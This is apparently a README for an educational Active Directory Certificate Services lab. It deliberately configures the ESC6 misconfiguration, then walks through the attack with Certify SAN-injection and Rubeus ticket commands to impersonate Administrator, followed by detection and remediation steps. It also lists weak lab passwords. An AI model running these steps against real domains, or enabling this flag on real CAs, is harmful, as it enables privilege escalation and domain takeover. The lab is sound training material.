# ADCS ESC6 Lab - Vulnerable CA Configuration (EDITF_ATTRIBUTESUBJECTALTNAME2)

> **⚠️ WARNING**: This is an intentionally vulnerable lab environment for educational purposes only. Do NOT deploy in production!

## Overview

Fully automated Active Directory Certificate Services lab demonstrating **ESC6 vulnerability**. This misconfiguration occurs when the Certificate Authority (CA) allows users to specify the **Subject Alternative Name (SAN)** in their certificate request, overriding template settings.

### What is ESC6?

By default, Active Directory Certificate Services ignores the SAN field in certificate requests for "User" templates to prevent impersonation. However, if the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag is enabled on the CA's policy module, the CA will **trust and issue** certificates with whatever SAN the requester specifies.

This allows any user to:
1.  Request a certificate using a standard "User" template.
2.  Inject a SAN for a high-privileged user (e.g., `Administrator` or `Domain Admins`).
3.  Use the certificate to authenticate as that user.

---

## Lab Architecture

```
┌──────────────────────────────────────┐
│   Host-Only Network: 192.168.57.0/24│
│   Gateway: (Isolated)                │
└──────────────────────────────────────┘
           │
    ┌──────┴───────┐
    │              │
┌───▼────┐    ┌───▼────┐
│ESC6-DC │    │CLT-01  │
│Win2019 │    │ Win 10 │
└────────┘    └────────┘
.57.26        .57.27

Domain: adcs.local
CA: ADCS-CA-ESC6 (Manual Installation)
Vulnerability: EDITF_ATTRIBUTESUBJECTALTNAME2 is Enabled
```

---

## Prerequisites

- **VirtualBox** 7.x
- **Vagrant** 2.3+
- **12GB RAM** minimum (DC: 8GB, CLIENT: 4GB)
- **50GB free disk space**

---

## Provisioning Walkthrough

### 1. Start the Domain Controller
1.  **Launch the DC**:
    ```powershell
    cd E:\ADCS\adcs-esc6-lab
    vagrant up dc
    ```
2.  **Wait**: ~15 minutes for Hostname change, AD DS installation, and User creation.

### 2. Manual Certificate Authority Installation
1.  **Log in to DC**: `192.168.57.26` as `Administrator`.
2.  **Install Role**: Active Directory Certificate Services > **Certification Authority**.
3.  **Configure CA**:
    -   Type: **Enterprise CA**
    -   Key: **RSA 2048**
    -   Name: `ADCS-CA-ESC6`

### 3. Configure ESC6 Vulnerability (Manual)
The core of ESC6 is a specific registry flag on the CA.

1.  Open **Command Prompt (Admin)** on the DC.
2.  Enable the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag:
    ```cmd
    certutil -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
    ```
3.  Restart the Certificate Service to apply changes:
    ```cmd
    net stop certsvc & net start certsvc
    ```

### 4. Publish Templates
1.  Open `certsrv.msc`.
2.  Ensure the **User** template is published (it is by default).

### 5. Provision the Client
1.  **Launch Client**:
    ```powershell
    vagrant up client
    ```
2.  **Login**: Use any lab user (e.g., `johndoe`).

---

## Lab Credentials

| Username | Password | Email | Role |
|----------|----------|-------|------|
| `ADCS\Administrator` | `P@ssw0rd!123` | - | Domain Admin |
| `ADCS\johndoe` | `Summer2024!` | johndoe@adcs.local | User |
| `ADCS\janesmith` | `Winter2024!` | janesmith@adcs.local | User |
| `ADCS\alicejohnson` | `Spring2024!` | alicejohnson@adcs.local | User |
| `ADCS\bobwilliams` | `Autumn2024!` | bobwilliams@adcs.local | User |
| `ADCS\charliebrown` | `Coffee2024!` | charliebrown@adcs.local | User |

---

## ESC6 Attack Walkthrough

### 1. Discovery
Attackers check the CA configuration for the dangerous flag.

```powershell
# From ESC6-CLIENT
# Use Certify or PSPki
.\Certify.exe find

# Look for:
#   "EDITF_ATTRIBUTESUBJECTALTNAME2" in the enabled policy flags.
```

### 2. Exploitation (SAN Injection)
Since the flag is on, we can use the default **User** template (which usually forbids SANs) and inject one anyway.

```powershell
# Request as 'johndoe', but ask to be 'Administrator'
.\Certify.exe request /ca:192.168.57.26\ADCS-CA-ESC6 /template:User /altname:Administrator

# Output:
#   [*] Certificate request sent...
#   [+] Issued!
```

### 3. Escalation
1.  **Convert** the issued PEM certificate to PFX.
    ```powershell
    certutil -MergePFX .\admin.pem .\admin.pfx
    ```
2.  **Authenticate** as Administrator using Rubeus.
    ```powershell
    .\Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx /password:<mypass> /ptt
    ```

---

## Detection

### Event IDs
| Event ID | Source | Description |
|----------|--------|-------------|
| 4887 | Microsoft-Windows-CertificationAuthority | Certificate Issued (Look for SubjectAltName extension) |

### Remediation
1.  **Disable the Flag**:
    ```cmd
    certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
    net stop certsvc & net start certsvc
    ```
2.  **Revoke**: Revoke any suspicious certificates issued while the flag was active.

---

## Lab Management

```powershell
vagrant up      # Start
vagrant destroy # Destroy
```
